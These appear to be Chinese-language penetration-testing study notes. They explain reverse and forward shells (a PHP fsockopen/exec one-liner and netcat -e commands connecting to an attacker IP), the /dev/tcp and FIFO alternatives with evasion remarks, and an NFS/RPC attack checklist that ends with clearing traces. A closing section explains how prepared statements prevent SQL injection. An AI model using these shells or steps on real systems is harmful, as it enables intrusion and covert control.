$sock=fsockopen("kaliIP",port); fsockopen()：PHP 网络套接字函数，用于与指定 IP / 端口建立 TCP 连接；这里是让目标机主动连接攻击者的 Kali 主机（kaliIP 是攻击者 IP，port 是攻击者监听的端口），并将连接句柄赋值给 $sock（文件描述符默认是 3）。
exec("/bin/sh -i <&3 >&3 2>&3"); exec()：PHP 执行系统命令的函数，核心是启动交互式 Shell 并绑定到上述 TCP 连接：-/bin/sh -i：启动交互式 Shell（-i 保证可输入命令）；-<&3：将 Shell 的标准输入（stdin）重定向到套接字 3；->&3：将标准输出（stdout）重定向到套接字 3；-2>&3：将标准错误（stderr）重定向到套接字 3；最终实现 Shell 的所有输入 / 输出都通过 TCP 连接传递给攻击者。

思维导图

NetCat 即 nc

脚本中这几个都是指的什么，下面是解释

一、NetCat -e（执行命令，反向 / 正向 Shell 核心）

1. 作用

-e 是 NetCat（nc）的执行参数，核心功能是 “将网络连接与指定命令 / 程序的标准输入 / 输出绑定”—— 当 nc 建立网络连接后，自动执行指定命令，且命令的输入 / 输出 / 错误流全部重定向到网络套接字，是实现正向 Shell / 反向 Shell 的关键参数。

2. 语法与场景

用法 类型 示例（Kali 攻击机 IP：192.168.1.100，端口 443）
正向 Shell（目标机） 目标机监听 nc -lvp 443 -e /bin/bash（目标机监听 443 端口，攻击者连接后直接获取 bash）
反向 Shell（目标机） 目标机主动连接 nc 192.168.1.100 443 -e /bin/bash（目标机主动连接攻击机，绑定 bash 到连接）

3. 关键说明

  • **权限：执行 **-e 需要目标机 nc 支持该参数（部分系统为了安全，编译时禁用了 -e，如默认的 macOS / 部分 Linux 发行版）；
  • **风险：红队渗透中最常用的提权 / 控制手段，蓝队需监控含 **-e 的 nc 命令；
  • **替代：若 **-e 被禁用，需用后文的 FIFO/Backpipe 绕过。

二、NetCat /dev/tcp（伪设备，无 nc 二进制时的替代方案）

1. 作用

/dev/tcp 是 Linux Bash 内置的伪设备文件（并非真实设备），核心功能是 “通过文件操作模拟 TCP 网络连接”—— 无需安装 nc 二进制文件，直接通过 Bash 重定向即可实现网络通信，是 nc 被禁用时的经典绕过手段。

2. 原理

**Bash 会将 **/dev/tcp/目标IP/端口 解析为 TCP 套接字，对该文件的读写等价于通过 TCP 连接发送 / 接收数据，无需依赖 nc 程序。

3. 典型用法（反向 Shell）

4. 关键说明

  • 仅依赖 Bash：无需 nc、socat 等工具，只要目标机有 Bash 即可使用；
  • 隐蔽性：无二进制执行痕迹，易绕过基础检测；
  • **限制：仅支持 Bash（sh/zsh 等可能不兼容 **/dev/tcp）。

三、NetCat Backpipe（命名管道，绕过 - e 禁用）

1. 作用

“Backpipe”（反向管道）是****临时命名管道的俗称，核心是通过创建 FIFO（命名管道）文件，手动实现 “网络连接与 Shell 的输入输出绑定”—— 当 nc 禁用 -e 参数时，用管道替代 -e 的功能。

2. 原理

**通过 **mkfifo 创建命名管道（如 backpipe），将 nc 的网络输出定向到管道，管道内容作为 Shell 的输入；同时 Shell 的输出定向回 nc 的网络输入，形成双向通信。

3. 典型用法（反向 Shell）

4. 关键说明

  • **绕过 **-e 禁用：无需 nc 的 -e 参数，纯管道实现 Shell 绑定；
  • **临时文件：用完可删除 **rm backpipe，隐蔽性较好；
  • 兼容性：所有支持 FIFO 的 Linux/Unix 系统均可使用。

四、NetCat FIFO（命名管道，与 Backpipe 等价）

1. 定义

FIFO（First In First Out）即****命名管道，是 Linux/Unix 的一种特殊文件（类型标识为 p），本质是 “基于文件系统的管道”，可在不同进程间传递数据 —— 前文的 “Backpipe” 就是 FIFO 的具体应用，二者是 “概念（FIFO）+ 实操（Backpipe）” 的关系。

2. 核心区别（FIFO vs 匿名管道）

  • 匿名管道（|）：仅在父子进程间临时存在，生命周期随进程结束；
  • **FIFO（命名管道）：以文件形式存在于文件系统（如 **ls -l 显示 prw-r--r--），可在任意进程间通信，手动删除前一直存在。

3. 扩展用法（正向 Shell）

五、核心总结（红队视角）

用法 核心场景 优势 限制
nc -e 有 - e 权限的正向 / 反向 Shell 简单直接，一行命令 易被禁用，检测特征明显
/dev/tcp 无 nc 二进制时的反向 Shell 仅依赖 Bash，无二进制 仅支持 Bash
Backpipe/FIFO 禁用 - e 时的 Shell 绕过 兼容所有 nc 版本 需创建临时文件，略复杂

渗透测试 Checklist

  1. 端口扫描：nmap -p 111,135,139,445,2049
  2. RPC 枚举：rpcinfo -p target
  3. NFS 检查：showmount -e target 提权精讲有相关内容
  4. NIS 检查：ypwhich，domainname
  5. 尝试挂载：mount -t nfs
  6. 提取数据：ypcat passwd，搜索共享文件
  7. 漏洞利用：检查已知漏洞（CVE）
  8. 权限提升：利用 no_root_squash
  9. 横向移动：通过共享或窃取的凭据
  10. 清理痕迹：卸载共享，删除文件

RPC 在渗透测试中是****黄金目标，因为：

  1. 通常配置不当（no_root_squash）
  2. 泄露大量信息（用户、密码哈希）
  3. 可作为横向移动的跳板
  4. 很多管理员忽略了其安全性

特别关注：/etc/exports 配置和 NIS 域名猜解，这两个是常见的突破口。

  • 其中的”文件”不是真正的磁盘文件
  • 访问某些/proc 文件可能导致系统信息泄露
  • 排除它可以减少噪音和误报

彻底的 sql 防范，预处理 + 参数绑定

预处理语句 + 参数绑定能防范 SQL 注入，核心是将 “SQL 逻辑” 和 “用户输入数据” 完全分离，让数据库明确区分 “语法指令” 和 “普通数据”，从根源上避免用户输入被当作 SQL 代码执行，具体原理分 3 步解析：

1. 预处理阶段：先发送 “SQL 模板”，固定执行逻辑

使用预处理语句时，第一步是向数据库发送包含占位符（如 ?）的 SQL 模板，数据库会先解析这个模板，确定 SQL 的执行逻辑（表、字段、条件结构），但不执行具体查询：

此时数据库已经明确：这条 SQL 的逻辑是 “从 auth 表查 pass 和 uname 匹配的记录”，后续传入的内容只会被当作 “pass/uname 的具体值”，不会改变 SQL 的结构。

2. 参数绑定阶段：数据以 “纯值” 传递，不参与 SQL 解析

参数绑定是将用户输入作为 “原始数据” 传递给数据库，而不是拼接到 SQL 语句中。关键区别：

  • 传统拼接：用户输入会被直接嵌入 SQL 字符串，数据库会把输入内容当作 SQL 代码的一部分解析（比如注入的 ' OR '1'='1 会被当作条件逻辑）；
  • 参数绑定：用户输入会被数据库当作 “二进制 / 字符串数据” 处理，不会参与 SQL 的语法解析—— 即使输入包含 '、OR 等字符，数据库也只会把它当作 “pass/uname 字段的普通值”，而不是 SQL 指令。

3. 执行阶段：用绑定的数据填充模板，数据不会被执行

当参数绑定完成后，数据库会用绑定的 “纯数据” 填充预处理模板的占位符，执行查询。此时：

  • 注入内容（如 ' OR '1'='1）会被当作普通字符串存储在数据库的 “数据缓冲区” 中，而不是被解析为 SQL 语法；
  • 数据库会严格按照预处理阶段确定的逻辑执行（只匹配 pass/uname 的具体值），不会执行用户输入中的 “恶意 SQL 片段”。
